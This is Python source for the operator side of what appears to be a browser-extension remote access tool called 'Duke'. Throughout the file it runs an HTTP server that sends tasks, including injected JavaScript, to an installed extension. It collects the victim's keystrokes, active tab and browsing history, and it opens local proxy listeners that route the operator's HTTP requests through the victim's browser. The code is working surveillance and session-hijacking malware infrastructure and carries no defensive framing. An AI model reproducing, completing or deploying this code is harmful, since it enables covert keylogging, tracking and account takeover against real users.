# ──────────────────────────────────────────────────────
# HANDLER (embedded, mirrors handler.py)
# ──────────────────────────────────────────────────────

TASK_QUEUE    = queue.Queue()
RESULT_STORE  = {}
RESULT_EVENTS = {}
TASK_ID       = 0
LOCK          = threading.Lock()
KEYLOG_QUEUE  = queue.Queue()

# Transport mode: 'longpoll' (default, hold connection) or 'fastpoll' (200ms short-poll)
POLL_MODE = 'longpoll'
LONGPOLL_TIMEOUT = 30  # seconds to hold connection before 204

# Persistent tab tracking
ACTIVE_TAB = {
    'tab_id': None,
    'url': '',
    'title': '',
    'ts': 0,
    'history': [],       # last N URLs visited
}
TAB_HISTORY_MAX = 50

# Fix #1: preload expiration (seconds)
PRELOAD_TTL = 300

CONN_STATE = {
    'connected':   False,
    'first_seen':  None,
    'last_seen':   None,
    'poll_count':  0,
    'result_count': 0,
    'client_ip':   None,
}

# Fix #2: thread-safe output queue for background messages
OUTPUT_QUEUE = queue.Queue()


def drain_output():
    """Flush any queued background messages before showing prompt."""
    while not OUTPUT_QUEUE.empty():
        try:
            msg = OUTPUT_QUEUE.get_nowait()
            sys.stdout.write(msg)
        except queue.Empty:
            break
    sys.stdout.flush()


def bg_print(msg):
    """Enqueue a message from a background thread for safe display."""
    OUTPUT_QUEUE.put(msg)


def notify_connection(client_ip):
    """Print connection banner immediately, overwriting the current prompt."""
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.write(
        f"\n  {BOLD}{GREEN}{'=' * 50}\n"
        f"  [+] EXTENSION CONNECTED!\n"
        f"  [+] Client IP: {client_ip}\n"
        f"  [+] Time: {time.strftime('%H:%M:%S')}\n"
        f"  {'=' * 50}{RESET}\n\n"
    )
    sys.stdout.write(f"{BOLD}{RED}proxy>{RESET} ")
    sys.stdout.flush()


def expire_preloads():
    """Remove preloaded results older than PRELOAD_TTL."""
    now = time.time()
    with LOCK:
        expired = [
            k for k, v in RESULT_STORE.items()
            if isinstance(k, str) and k.startswith('preload_')
            and isinstance(v, tuple) and (now - v[1]) > PRELOAD_TTL
        ]
        for k in expired:
            del RESULT_STORE[k]
        if expired:
            bg_print(f"  {YELLOW}[*] Expired {len(expired)} stale preload result(s){RESET}\n")


def preload_gc_loop():
    """Background thread that expires old preload results."""
    while True:
        time.sleep(60)
        expire_preloads()


class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == '/task':
            client_ip = self.client_address[0]
            with LOCK:
                was = CONN_STATE['connected']
                CONN_STATE['connected']  = True
                CONN_STATE['last_seen']  = time.time()
                CONN_STATE['poll_count'] += 1
                CONN_STATE['client_ip']  = client_ip
                if not was:
                    CONN_STATE['first_seen'] = time.time()
            if not was:
                notify_connection(client_ip)

            task = None
            if POLL_MODE == 'longpoll':
                # Block until a task is available or timeout
                try:
                    task = TASK_QUEUE.get(timeout=LONGPOLL_TIMEOUT)
                except queue.Empty:
                    task = None
            else:
                # Short-poll: return immediately
                try:
                    task = TASK_QUEUE.get_nowait()
                except queue.Empty:
                    task = None

            if task:
                data = json.dumps(task).encode()
                self.send_response(200)
                self._cors()
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(204)
                self._cors()
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/result':
            length = int(self.headers.get('Content-Length', 0))
            body   = self.rfile.read(length)
            try:
                result = json.loads(body)
                tid    = result.get('id', None)
                with LOCK:
                    CONN_STATE['result_count'] += 1
                    CONN_STATE['last_seen'] = time.time()
                    RESULT_STORE[tid] = result
                    if tid in RESULT_EVENTS:
                        RESULT_EVENTS[tid].set()
            except Exception:
                pass
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'OK')
        elif self.path == '/keylog':
            length = int(self.headers.get('Content-Length', 0))
            body   = self.rfile.read(length)
            try:
                data = json.loads(body)
                KEYLOG_QUEUE.put(data)
            except Exception:
                pass
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'OK')
        elif self.path == '/tab_update':
            length = int(self.headers.get('Content-Length', 0))
            body   = self.rfile.read(length)
            try:
                data = json.loads(body)
                url   = data.get('url', '')
                title = data.get('title', '')
                tab_id = data.get('tabId', None)
                ts    = data.get('ts', 0)
                with LOCK:
                    prev_url = ACTIVE_TAB['url']
                    ACTIVE_TAB['tab_id'] = tab_id
                    ACTIVE_TAB['url']    = url
                    ACTIVE_TAB['title']  = title
                    ACTIVE_TAB['ts']     = ts
                    # Track history (deduplicate consecutive)
                    if url and url != prev_url:
                        ACTIVE_TAB['history'].append({
                            'url': url,
                            'title': title,
                            'ts': ts,
                        })
                        if len(ACTIVE_TAB['history']) > TAB_HISTORY_MAX:
                            ACTIVE_TAB['history'] = ACTIVE_TAB['history'][-TAB_HISTORY_MAX:]
            except Exception:
                pass
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()


def start_server(ip, port):
    server = http.server.HTTPServer((ip, port), ProxyHandler)
    server.serve_forever()


def submit_task(url=None, method='GET', body=None, headers=None, task_type=None, **extra):
    """Submit a task to the extension. Builds the task dict based on task_type."""
    global TASK_ID
    with LOCK:
        TASK_ID += 1
        tid = TASK_ID
    evt = threading.Event()
    with LOCK:
        RESULT_EVENTS[tid] = evt

    task = {'id': tid}

    if task_type:
        task['type'] = task_type
        # Merge any extra fields (e.g. code for js injection)
        task.update(extra)
    else:
        # Default: HTTP fetch task
        task['url'] = url
        task['method'] = method
        if body:
            task['body'] = body
        if headers:
            task['headers'] = headers

    TASK_QUEUE.put(task)
    return tid, evt


def wait_result(tid, evt, timeout=30):
    if evt.wait(timeout=timeout):
        with LOCK:
            result = RESULT_STORE.pop(tid, None)
            RESULT_EVENTS.pop(tid, None)
        return result
    else:
        with LOCK:
            RESULT_EVENTS.pop(tid, None)
        return None


def do_request(url, method='GET', body=None, headers=None, timeout=30):
    tid, evt = submit_task(url, method, body, headers)
    print(f"  {YELLOW}[*] Task #{tid} queued, waiting...{RESET}", end='', flush=True)
    result = wait_result(tid, evt, timeout)
    print(f"\r" + " " * 60 + "\r", end='')
    return result


def display_result(result):
    if not result:
        print(f"  {RED}[!] Timeout - no response from extension{RESET}")
        return None
    if 'error' in result:
        print(f"  {RED}[!] Error: {result['error']}{RESET}")
        return None

    status = result.get('status', '?')
    url    = result.get('url', '?')
    hdrs   = result.get('headers', {})
    b64body = result.get('body', '')

    color = GREEN if 200 <= status < 300 else YELLOW if 300 <= status < 400 else RED
    print(f"  {color}{BOLD}[{status}]{RESET} {CYAN}{url}{RESET}")

    if hdrs:
        print(f"  {BLUE}Headers:{RESET}")
        for k, v in hdrs.items():
            print(f"    {k}: {v}")

    try:
        decoded = base64.b64decode(b64body)
    except Exception:
        decoded = b''

    print(f"  {BLUE}Body ({len(decoded)} bytes):{RESET}")
    try:
        text  = decoded.decode('utf-8', errors='replace')
        lines = text.split('\n')
        for line in lines[:80]:
            print(f"    {line}")
        if len(lines) > 80:
            print(f"    {YELLOW}... ({len(lines) - 80} more lines){RESET}")
    except Exception:
        print(f"    {YELLOW}(binary data, use 'save <file>' to save){RESET}")

    return decoded


# ──────────────────────────────────────────────────────
# FORWARDING LISTENERS (local HTTP proxy -> extension)
# ──────────────────────────────────────────────────────

LISTENERS = {}       # id -> {port, server, thread, created}
LISTENER_SEQ = 0


class ForwardingProxyHandler(http.server.BaseHTTPRequestHandler):
    """
    Local HTTP proxy handler.  Firefox/curl sends requests here;
    we forward them through the extension via the task queue and
    relay the response back.

    Supports both regular HTTP proxy requests (GET http://host/path)
    and CONNECT tunneling (rejected — we only handle HTTP).
    """

    # silence per-request log lines
    def log_message(self, fmt, *args):
        pass

    def _forward(self, method):
        # Reconstruct the target URL
        # Browsers send full URLs in proxy mode: GET http://host/path HTTP/1.1
        url = self.path
        if not url.startswith('http'):
            # relative path — shouldn't happen in proxy mode but handle it
            url = f"http://{self.headers.get('Host', 'localhost')}{self.path}"

        # Read request body if present
        content_len = int(self.headers.get('Content-Length', 0))
        req_body = self.rfile.read(content_len) if content_len > 0 else None

        # Collect relevant headers (skip hop-by-hop)
        skip = {'host', 'proxy-connection', 'proxy-authorization',
                'te', 'trailers', 'transfer-encoding', 'upgrade',
                'connection', 'keep-alive'}
        fwd_headers = {}
        for k, v in self.headers.items():
            if k.lower() not in skip:
                fwd_headers[k] = v

        # Submit through the extension
        body_str = req_body.decode('utf-8', errors='replace') if req_body else None
        tid, evt = submit_task(url, method, body=body_str,
                               headers=fwd_headers if fwd_headers else None)
        result = wait_result(tid, evt, timeout=60)

        if not result or 'error' in result:
            err_msg = 'timeout'
            if result and 'error' in result:
                err_msg = result['error']
            self.send_response(502)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"Duke proxy error: {err_msg}\n".encode())
            return

        # Relay status
        status = result.get('status', 502)
        self.send_response(status)

        # Relay headers (skip hop-by-hop + encoding headers since fetch() decompresses)
        resp_headers = result.get('headers', {})
        skip_resp = {'transfer-encoding', 'connection', 'keep-alive',
                     'proxy-authenticate', 'proxy-authorization', 'te',
                     'trailers', 'upgrade',
                     'content-encoding', 'content-length'}
        for k, v in resp_headers.items():
            if k.lower() not in skip_resp:
                self.send_header(k, v)

        # Decode body
        try:
            body_bytes = base64.b64decode(result.get('body', ''))
        except Exception:
            body_bytes = b''

        # Override content-length with actual decoded size
        self.send_header('Content-Length', str(len(body_bytes)))
        self.end_headers()
        self.wfile.write(body_bytes)

    def do_GET(self):
        self._forward('GET')

    def do_POST(self):
        self._forward('POST')

    def do_PUT(self):
        self._forward('PUT')

    def do_DELETE(self):
        self._forward('DELETE')

    def do_PATCH(self):
        self._forward('PATCH')

    def do_HEAD(self):
        self._forward('HEAD')

    def do_OPTIONS(self):
        self._forward('OPTIONS')

    def do_CONNECT(self):
        # HTTPS tunneling — not supported through HTTP extension fetch
        self.send_response(501)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"CONNECT (HTTPS tunneling) not supported by Duke proxy.\n"
                         b"Use HTTP targets only.\n")


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def add_listener(port):
    """Start a forwarding proxy on the given local port."""
    global LISTENER_SEQ
    port = int(port)

    # Check for duplicate
    with LOCK:
        for lid, info in LISTENERS.items():
            if info['port'] == port:
                print(f"  {RED}[!] Port {port} already in use by listener #{lid}{RESET}")
                return

    try:
        srv = ThreadedHTTPServer(('127.0.0.1', port), ForwardingProxyHandler)
    except OSError as e:
        print(f"  {RED}[!] Cannot bind 127.0.0.1:{port} — {e}{RESET}")
        return

    with LOCK:
        LISTENER_SEQ += 1
        lid = LISTENER_SEQ

    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    with LOCK:
        LISTENERS[lid] = {
            'port': port,
            'server': srv,
            'thread': t,
            'created': time.time(),
        }

    print(f"  {GREEN}{BOLD}[+] Listener #{lid}{RESET} started on {CYAN}127.0.0.1:{port}{RESET}")
    print(f"  {YELLOW}    Configure Firefox HTTP proxy: 127.0.0.1:{port}{RESET}")
    print(f"  {YELLOW}    Or: curl -x http://127.0.0.1:{port} http://target/{RESET}")


def list_listeners():
    """Print all active forwarding listeners."""
    with LOCK:
        items = list(LISTENERS.items())
    if not items:
        print(f"  {YELLOW}[*] No active listeners{RESET}")
        return
    print(f"  {BOLD}{'ID':>4}  {'Port':>6}  {'Uptime':>10}  Status{RESET}")
    print(f"  {'─' * 40}")
    now = time.time()
    for lid, info in items:
        up = now - info['created']
        alive = info['thread'].is_alive()
        sc = GREEN if alive else RED
        st = 'ALIVE' if alive else 'DEAD'
        print(f"  {sc}{lid:>4}  {info['port']:>6}  {up:>8.0f}s  {st}{RESET}")


def rm_listener(lid):
    """Shutdown and remove a forwarding listener by ID."""
    lid = int(lid)
    with LOCK:
        info = LISTENERS.pop(lid, None)
    if not info:
        print(f"  {RED}[!] Listener #{lid} not found{RESET}")
        return
    try:
        info['server'].shutdown()
    except Exception:
        pass
    print(f"  {GREEN}[+] Listener #{lid} (port {info['port']}) removed{RESET}")


